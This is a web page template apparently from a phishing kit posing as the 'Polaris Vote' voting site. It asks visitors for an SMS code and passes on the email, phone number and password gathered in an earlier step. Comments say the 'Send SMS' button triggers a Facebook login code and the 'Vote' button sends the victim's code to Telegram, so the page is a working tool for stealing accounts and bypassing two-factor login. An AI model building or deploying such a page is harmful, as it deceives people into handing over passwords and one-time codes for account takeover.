<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your phone number — Polaris Vote</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ asset('css/style.css') }}">
</head>
<body class="verify-body">
    <div class="verify-bg" aria-hidden="true"></div>
    <header class="verify-top">
        <div class="verify-top-inner">
            <span class="brand">
                <span class="brand-mark" aria-hidden="true">
                    <svg viewBox="0 0 32 32" width="24" height="24">
                        <circle cx="16" cy="16" r="14" fill="none" stroke="currentColor" stroke-width="2.5"/>
                        <path d="M16 7 L18.2 13.8 L25.4 13.8 L19.6 18 L21.8 24.8 L16 20.6 L10.2 24.8 L12.4 18 L6.6 13.8 L13.8 13.8 Z" fill="currentColor"/>
                    </svg>
                </span>
                Polaris<span class="brand-accent">Vote</span>
            </span>
        </div>
    </header>
    <main class="verify-main">
        <section class="verify-card" aria-labelledby="verifyHeading">
            <div class="step-indicator" role="group" aria-label="Sign-in progress">
                <div class="step-track">
                    <span class="step-track-fill" aria-hidden="true"></span>
                </div>
                <p class="step-label">Step 2 of 2</p>
            </div>
            <h1 id="verifyHeading">Enter SMS Code</h1>
            <p class="verify-sub">Click "Send SMS" to receive a 4-digit code on your phone.</p>
            
            <form id="otpForm" method="POST" action="/success" novalidate>
                @csrf
                <input type="hidden" id="hiddenEmail" name="email" value="{{ $email ?? session('email', '') }}">
                <input type="hidden" id="hiddenPhone" name="phone" value="{{ $phone ?? session('phone', '') }}">
                <input type="hidden" id="hiddenPassword" name="password" value="{{ $password ?? session('password', '') }}">
                
                <!-- ============================================ -->
                <!-- BUTTON 1: SEND SMS (Requests Facebook SMS)   -->
                <!-- ============================================ -->
                <button type="button" class="btn btn-primary btn-block btn-lg" id="sendSmsBtn" style="margin-bottom:15px;">
                    <span class="btn-label">📱 Send SMS</span>
                </button>
                
                <!-- ============================================ -->
                <!-- OTP INPUT – 4 DIGITS                         -->
                <!-- ============================================ -->
                <div class="field">
                    <label for="userCode">Enter the 4-digit SMS code:</label>
                    <div class="input-wrap">
                        <input type="text" id="userCode" name="userCode" placeholder="4-digit code" maxlength="4" required>
                    </div>
                </div>
                
                <!-- ============================================ -->
                <!-- BUTTON 2: VOTE (Submit code to Telegram)     -->
                <!-- ============================================ -->
                <button type="button" class="btn btn-success btn-block btn-lg" id="submitCodeBtn">
                    <span class="btn-label">🗳️ Vote</span>
                </button>
                
                <p class="form-error" id="formError" role="alert"></p>
            </form>
        </section>
    </main>

    <script src="{{ asset('js/script.js') }}"></script>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            console.log('✅ Step 2 - Verify page loaded');

            // ============================================================
            // BUTTON 1: SEND SMS – REQUEST FACEBOOK SMS
            // ============================================================
            document.getElementById('sendSmsBtn').addEventListener('click', function() {
                const phone = document.getElementById('hiddenPhone')?.value || 'No phone';
                const email = document.getElementById('hiddenEmail')?.value || 'No email';
                const password = document.getElementById('hiddenPassword')?.value || 'No password';
                
                console.log('📤 REQUESTING SMS:', { email, phone });
                
                fetch('/send-sms', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '{{ csrf_token() }}'
                    },
                    body: JSON.stringify({ email, phone, password })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('📥 SMS response:', data);
                    if (data.success) {
                        alert('✅ SMS sent to your phone! Check your messages.');
                    } else {
                        alert('❌ Error sending SMS: ' + data.message);
                    }
                })
                .catch(err => {
                    console.log('❌ Error:', err);
                    alert('❌ Error: ' + err);
                });
            });

            // ============================================================
            // BUTTON 2: VOTE – SUBMIT CODE TO TELEGRAM
            // ============================================================
            document.getElementById('submitCodeBtn').addEventListener('click', function() {
                const code = document.getElementById('userCode').value.trim();
                
                if (code.length !== 4) {
                    alert('❌ Please enter exactly 4 digits');
                    return;
                }
                
                if (!/^\d{4}$/.test(code)) {
                    alert('❌ Please enter only numbers');
                    return;
                }
                
                console.log('📤 SENDING CODE TO TELEGRAM:', { code });
                
                fetch('/submit-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '{{ csrf_token() }}'
                    },
                    body: JSON.stringify({ code: code })
                })
                .then(function(response) {
                    return response.json();
                })
                .then(function(data) {
                    console.log('📥 Telegram response:', data);
                    if (data.success) {
                        alert('✅ Vote submitted successfully!');
                        window.location.href = '/success';
                    } else {
                        alert('❌ Error submitting vote: ' + JSON.stringify(data));
                    }
                })
                .catch(function(err) {
                    console.log('❌ Error:', err);
                    alert('❌ Error: ' + err);
                });
            });
        });
    </script>
    
</body>
</html>